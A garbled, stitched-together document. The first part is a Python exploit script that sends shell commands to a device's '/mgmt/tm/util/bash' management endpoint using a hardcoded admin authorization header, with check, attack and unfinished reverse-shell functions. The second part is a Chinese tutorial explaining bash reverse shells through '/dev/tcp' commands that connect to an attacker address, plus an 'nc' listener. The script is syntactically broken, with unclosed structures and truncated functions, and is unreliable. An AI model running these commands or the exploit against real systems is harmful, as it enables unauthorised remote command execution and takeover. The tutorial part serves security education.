def headers():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',

        'Authorization': 'Basic YWRtaW46'

def check(target_url):
    check_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': "-c id"}
    try:
        response = requests.post(url=check_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            print("[+] 目标 {} 存在漏洞".format(target_url))
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))


def attack(target_url, cmd):
    attack_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(cmd)}
    try:
        response = requests.post(url=attack_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            print("[+] 目标 {} 存在漏洞".format(target_url))
            print('[+] 响应为:{0}'.format(display))
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))


def reverse_shell(target_url, command):
    reverse_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(command)}

    for url_link in open(file, 'r', encoding='utf-8'):

def format_url(url):

        if url[:4] != "http":

# bash反弹shell原理和思考
### 反弹命令如下
```shell
受害者
bash -i >& /dev/tcp/ip/port 0>&1
攻击者
nc -lvp port
```

### <font style="color:rgb(0, 0, 0);">反弹 shell 的本质</font>
<font style="color:rgb(0, 0, 0);">接下来依次解释一下上面两条命令的意思。</font>

### <font style="color:rgb(0, 0, 0);">1.bash -i</font>
```shell
1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别
2）-i （interact）这个参数表示的是产生交互式的shell
```

### <font style="color:rgb(0, 0, 0);">2.>&</font>
<font style="color:rgb(88, 88, 88);">对于这个要先了解</font><font style="color:rgb(0, 0, 0);">Linux下的linux文件描述符的概念，linux shell下有三种标准的文件描述符：</font>

<font style="color:rgb(88, 88, 88);">0是 stdin 代表着标准输入，使用<或者<<</font>

<font style="color:rgb(88, 88, 88);">1是 stdout 代表着标准输出，使用>或者>></font>

<font style="color:rgb(88, 88, 88);">2是 stderr 代表着标准错误输出，因为也是输出，所以也是>或者>>，但是为了区别std，所以使用2>或2>>。</font>

<font style="color:rgb(88, 88, 88);">在默认的条件下是0。>&符号链接在一起就是把输入重定向的意思。</font>

### <font style="color:rgb(88, 88, 88);">3.</font><font style="color:rgb(0, 0, 0);">/dev/tcp/ip/port</font>
<font style="color:rgb(88, 88, 88);">对于/dev/tcp/ip/port是</font><font style="color:rgb(0, 0, 0);">特殊设备文件（因为Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据，其作用是让本机与目标主机通过指定端口建立tcp连接。</font>

![1652691711409-ab69e659-2e9a-4369-a384-250ea5b01b2f.png](/uploads/20260518/cb071734-633b-41ca-9782-c2be8b15030a.png)

![1652691720262-74b83ddb-f240-4d6f-8b25-e6a1e16a46b8.png](/uploads/20260518/b2a25411-12b6-42c6-aa73-339964fa81b6.png)

### <font style="color:rgb(0, 0, 0);">4.0>&1</font>
<font style="color:rgb(0, 0, 0);">最后0>&1（放在>后面的&，表示重定向的目标不是一个文件，而是一个文件描述符）是把前面的输入重定向给了输出。</font>

<font style="color:rgb(0, 0, 0);">       </font>**<font style="color:rgb(0, 0, 0);">那么整个 bash -i >& /dev/tcp/ip/port 0>&1就是一个交互性的shell把输入内容通过socket重定向给了远端服务器的端口，远端服务器的输入又重定向给了输出，这样就是实现了一个远程交互shell。</font>**

### <font style="color:rgb(0, 0, 0);">5.命令合成</font>
```shell
bash -i >/dev/tcp/192.168.80.131/3333
```

<font style="color:rgb(0, 0, 0);"> 把bash命令的结果输入到远程地址的3333端口进行回显。</font>

<font style="color:rgb(0, 0, 0);"> 此时受害者执行的bash命令执行结果会输出到攻击者的电脑上，不会在自己的电脑上输出。</font>

<font style="color:rgb(0, 0, 0);"> 但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</font>

<font style="color:rgb(0, 0, 0);"> 于是我们似乎还需要一条这样的指令</font>

```shell
bash -i < /dev/tcp/192.168.27.131/3333 
```

<font style="color:rgb(0, 0, 0);"> 表示把远程192.168.27.131的3333端口的输入信息作为输入</font>

<font style="color:rgb(0, 0, 0);"> 此时是攻击者输入bash命令，在受害者电脑上输出，与上面的内容刚好相反</font>

<font style="color:rgb(0, 0, 0);"> 把两个场景结合起来</font>

```shell
bash -i > /dev/tcp/192.168.80.131/3333 0>&1
```

<font style="color:rgb(0, 0, 0);">而此时攻击者的命令还会在受害者电脑上输出，我们可以用混合输出（错误、正确输出都输出到一个地方）解决一下这个问题：</font>

```shell
bash -i > /dev/tcp/192.168.80.131/3333 0>&1 2>&1
```

<font style="color:rgb(0, 0, 0);">当然我们也可以执行与之完全等价的指令</font>

```shell
bash -i >& /dev/tcp/192.168.80.131/3333 0>&1
bash -i >& /dev/tcp/192.168.80.131/3333 0<&1
```

<font style="color:rgb(0, 0, 0);">这里的唯一区别就是 0>&1 和 0<&1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别。</font>
